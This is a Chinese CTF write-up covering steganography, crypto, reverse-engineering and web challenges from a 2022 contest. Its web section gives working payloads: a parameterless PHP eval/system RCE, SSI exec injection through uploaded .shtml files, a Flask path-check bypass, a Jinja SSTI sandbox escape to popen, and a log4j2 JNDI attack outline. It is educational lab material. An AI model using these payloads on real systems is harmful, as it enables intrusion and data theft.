120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61]</span><br><span class="line">for i in s:</span><br><span class="line">    print(chr(i),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>得到base64，解码是01串，明显的二维码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000&#x27;</span><br><span class="line">s = s.split(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line">pic = Image.new(&#x27;RGB&#x27;,(37,37),(255,255,255))</span><br><span class="line">for i in range(37):</span><br><span class="line">    for j in range(37):</span><br><span class="line">        if(s[i][j] == &#x27;0&#x27;):</span><br><span class="line">            pic.putpixel((j,i),(0,0,0))</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&#x27;fllllag.png&#x27;)</span><br></pre></td></tr></table></figure>

<p>扫码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【ez-Encrypt】"><a href="#【ez-Encrypt】" class="headerlink" title="【ez_Encrypt】"></a>【ez_Encrypt】</h3><p>pyc的steg很明显是剑龙，注意python版本号，我用3.9没跑出来，3.6能跑</p>
<p>跑出来得到key：St3g1sV3ryFuNny</p>
<p>当然密文更明显是emoji-aes，解密得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【Ez-Steg】"><a href="#【Ez-Steg】" class="headerlink" title="【Ez_Steg】"></a>【Ez_Steg】</h3><p>这次题目的流量包都只需要导出HTTP就能做了</p>
<p>导出之后有个web123，是base64，同样cyberchef解码得到zip文件，用D盾扫<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/b5d8a99411384ceb91fc6a783ef60ca1.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fxGyG6JZ-1641631822289)(mumuzi.assets/image-20220108153726810.png)]"></p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-164189500212110.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jCDmViZG-1641631822293)(mumuzi.assets/image-20220108153734258.png)]"></p>
<p>百度找一个解php混淆的，除去广告第一个就是<a href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a></p>
<p>解密得到flag<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-164189501844412.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-U2XyWpF1-1641631822296)(mumuzi.assets/image-20220108153841460.png)]"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【pipicc】"><a href="#【pipicc】" class="headerlink" title="【pipicc】"></a>【pipicc】</h3><p>可以看到 327006.bmp 中有一片噪点，猜测是对像素点有所修改，用 010editor 打开，可以在 BITMAPLINE 结构中看到 IHDR 头，看不见 png 头，手动补上.</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199836171414.webp" alt=" "></p>
<p>补上以后</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199843626116.webp" alt=" "></p>
<p>找到IEND块，手动提取出png文件</p>
<p>得到1.png</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199845830218.webp" alt=" "></p>
<p>用stegsolve打开1.png提取低位数据，在蓝色的低位可以看到</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199848137820.webp" alt=" "></p>
<p>d9ff，联想到jpg的文件尾，但是是倒序的，save bin提取出来得到1.bin</p>
<p>保存得到1.bin</p>
<p>搜索 d8 ff，从第一个d8 ff 开始 删掉后面的内容，然后倒序，可以用010editor的script里的stringreverse<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199850985522.webp" alt=" "></p>
<p>得到jpg图片</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199851628124.webp" alt="图片"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><p>就单纯的异或，通过格式cazy{找出key的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key = b&#x27;\x5f\x11\x32\xff\x61&#x27;</span><br><span class="line">s = b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(chr(key[i%5]^s[i]),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><p>单纯的爆破key,给了key的范围是1,1&lt;&lt;20</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">def pad(m):</span><br><span class="line">    tmp = 16-(len(m)%16)</span><br><span class="line">    return m + bytes([tmp for _ in range(tmp)])</span><br><span class="line"></span><br><span class="line">enc=b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span><br><span class="line">for i in tqdm(range(1&lt;&lt;20)):</span><br><span class="line">    key=pad(long_to_bytes(i))</span><br><span class="line">    aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">    s = aes.decrypt(enc)</span><br><span class="line">    if b&#x27;cazy&#123;&#x27; in s:</span><br><span class="line">        print(s)</span><br></pre></td></tr></table></figure>

<h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import*</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">s = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span><br><span class="line">s -= 0x0338470</span><br><span class="line">s = gmpy2.iroot(s,2)[0]</span><br><span class="line">s = -s</span><br><span class="line">s += (1&lt;&lt;500)</span><br><span class="line">print(long_to_bytes(s))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;1234567890_no_m4th_n0_cRy&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><p>用ida打开看main就看见加密的flag了，上面函数明显的rot13</p>
<p>在线rot13解一下就行了，然后套上flag{}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><p>IDA打开ctf1.exe，搜字符串，看见ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</p>
<p>base64解码就是flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Ch1na_yyds_cazy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 easy_py.cpython-38.pyc &gt; easy_py.py</span><br></pre></td></tr></table></figure>

<p>出来一个py文件，看了下，首先进encrypt1进行异或，再进入encrypt2进行异或，然后输出和Happy进行比较</p>
<p>既然是这样，那不妨反过来，把num从9到0改成从0到9，把该减的地方改成加，该执行的顺序也换一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 3.8 (3413)</span><br><span class="line"># Decompiled from: Python 3.8.7 (default, Dec 22 2020, 10:37:26) </span><br><span class="line"># [GCC 10.2.1 20201207]</span><br><span class="line"># Embedded file name: C:\Users\Administrator\Desktop\easy_py.py</span><br><span class="line"># Compiled at: 2021-12-28 15:45:17</span><br><span class="line"># Size of source mod 2**32: 1099 bytes</span><br><span class="line">import threading, time</span><br><span class="line"></span><br><span class="line">def encode_1(n):</span><br><span class="line">    global num</span><br><span class="line">    while True:</span><br><span class="line">        if num &lt;= 9:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num += 1</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        if num &gt; 9:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode_2(n):</span><br><span class="line">    global num</span><br><span class="line">    while True:</span><br><span class="line">        if num &lt;= 9:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + 1)]</span><br><span class="line">            num += 1</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        if num &gt; 9:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    Happy = [</span><br><span class="line">     44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">    num = 0</span><br><span class="line">    f = input(&#x27;Please input your flag:&#x27;)</span><br><span class="line">    if len(f) == 10:</span><br><span class="line">        print(&#x27;Your input is illegal&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        flag = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">        if(1 == 2):</span><br><span class="line">            print(&#x27;crazymumuzi!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;flag to &#x27;ord&#x27;:&quot;, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(1, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(2,))</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for i in flag:</span><br><span class="line">            print(chr(i),end=&#x27;&#x27;)</span><br><span class="line">        if flag == Happy:</span><br><span class="line">            print(&#x27;Good job!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;No no no!&#x27;)</span><br><span class="line"># okay decompiling easy_py.cpython-38.pyc</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;He110_cazy&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="【RCE-No-Para】"><a href="#【RCE-No-Para】" class="headerlink" title="【RCE_No_Para】"></a>【RCE_No_Para】</h3><p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114247702.png" alt="image-20220113114247702"></p>
<p><strong>正则匹配</strong><br><code>/[^\W]+\((?R)?\)/</code><br><code>\W</code> 元字符用于查找非单词字符。<br>单词字符包括：a-z、A-Z、0-9，以及下划线。<br>故<code>[^\W]</code>可以匹配所有单词字符<br><code>+</code>表示可以匹配一个或多个<br><code>\(</code>和<code>\)</code>为左右括号<br><code>(?R)?</code>表示递归整个模式</p>
<p>故本题的code只能为<code>a(b(c()))</code>这种形式，而不能为<code>a(&#39;xxx&#39;)</code>的形式，为无参数RCE</p>
<p><strong>get_defined_vars()</strong><br>该函数可以返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114626736.png" alt="image-20220113114626736"></p>
<p>当我们传入<br><code>code=var_dump(get_defined_vars());&amp;a=phpinfo();</code><br>两变量时，我们自定义的变量a也出现在输出的变量中，我们便可以利用自定义的变量来绕过对code的限制进行rce<br>我们要想取到我们自定义变量的值，就需要使用函数来获取数组中的某一个值<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p>
<p>我们可以在get_defined_vars()前面加一个pos()用来去掉无关的变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=var_dump(pos(get_defined_vars()));&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114830289.png" alt="image-20220113114830289"></p>
<p>如果此时再用一个pos()将会取出code的值，于是我们可以把两个变量的位置交换之后再用pos()便可以取出我们自定义变量的值</p>
<p>最终payload：<br><code>a=system(&#39;cat flag.php&#39;);&amp;code=eval(pos(pos(get_defined_vars())));</code><br>在注释中找到flag</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114930314.png" alt="image-20220113114930314"></p>
<p><em>payload：<code>?code=system(array_rand(array_flip(current(get_defined_vars()))));&amp;b=cat%09flag.php</code></em></p>
<h3 id="【Baby-Upload】"><a href="#【Baby-Upload】" class="headerlink" title="【Baby_Upload】"></a>【Baby_Upload】</h3><p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113120258881.png" alt="image-20220113120258881"></p>
<p>做这道题会发现加了对文件内容的检测，过滤了一些符号，不过不会影响正常解题，过滤了<code>ph,ini,htaccess</code>，绕过不去，可以<code>shtml</code>来利用SSI注入RCE，但是过滤了很多命令，测试发现<code>ls</code>被过滤</p>
<p><code>ls</code>被过滤可以使用<code>dir</code>来列目录：</p>
<p><code>&lt;!--#exec cmd=&quot;dir /&quot;--&gt;</code>，存为<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113120501689.png" alt="image-20220113120501689"></p>
<p><code>1.shtml</code>之后上传，列出根目录，得知flag在<code>fffffflllll11111aaaaa4444ggggg</code>下，可以构造出：</p>
<p><code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot;--&gt;</code></p>
<p>来读取文件，存为<code>2.shtml</code>后上传获得flag。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113120703608.png" alt="image-20220113120703608"></p>
<h3 id="【flask】"><a href="#【flask】" class="headerlink" title="【flask】"></a>【flask】</h3><p>访问主页发现注释中有提示</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419977491672.webp" alt=" "></p>
<p>/admin  /static.js  一段python代码 此段代码为后端的URL Filter 当请求js类静态文件时不需要认证，而在请求其他路径时则会被重定向到login 在flask的官方文档中</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419977778474.webp" alt=" "></p>
<p>在请求<a href="http://localhost/admin?test=123">http://localhost/admin?test=123</a></p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419979169076.webp" alt=" "></p>
<p>而请求/admin;xxx=1&amp;test=123</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419979388478.webp" alt=" "></p>
<p>对<code>request.path</code> 来说其值为<code>/admin;xxx=1</code>并没有把<code>path parameter</code>去掉，在代码中的判断使用的是<code>request.full_path</code><br>而在<code>request.full_path</code>中是包含了<code>query string</code>因此只要发起这样的请求：随意增加一个参数，并且参数值是以.js?结尾即可绕过校检<code>/admin?xxx=.js?</code>这里不能用<code>;</code>的原因是<code>request.path</code>并没有去掉 <code>path parameter</code> 在没有带上<code>query string</code>的情况下<code>full_path：/admin;x=.js?</code>满足<code>.js?</code>而<code>request.path:/admin;x=.js</code>路由表中没有<code>admin;x=.js</code>从而404</p>
<p>进入之后就是常规的ssti绕沙箱</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199797036410.webp" alt=" "></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aa:__class__ </span><br><span class="line">bb:__mro__</span><br><span class="line">cc:__subclasses__</span><br><span class="line">dd:__init__</span><br><span class="line">ee:__globals__</span><br></pre></td></tr></table></figure>

<p><code>((((request|attr(request.cookies.get(&#39;aa&#39;))|attr(request.cookies.get(&#39;bb&#39;))|list).pop(-1)|attr(request.cookies.get(&#39;cc&#39;))()).pop(117)|attr(request.cookies.get(&#39;dd&#39;))|attr(request.cookies.get(&#39;ee&#39;))).get(&#39;popen&#39;)(&#39;ls&#39;).read())</code></p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199809935312.webp" alt=" "></p>
<h3 id="【Shiro-】"><a href="#【Shiro-】" class="headerlink" title="【Shiro?】"></a>【Shiro?】</h3><p>虽然登录界面伪造了一个shiro反序列化漏洞，但是实际漏洞点是在登录处的log4j2RCE漏洞。起一个ldap服务用于加载恶意类。运行环境Java版本较高需要bypass，即可正常攻击，可利用JNDIExploit工具进行攻击。用{::-n}等规则替换关键字和ip地址即可绕过规则， 也可用woodpecker生成payload， 在登录点username处输入payload即可</p>
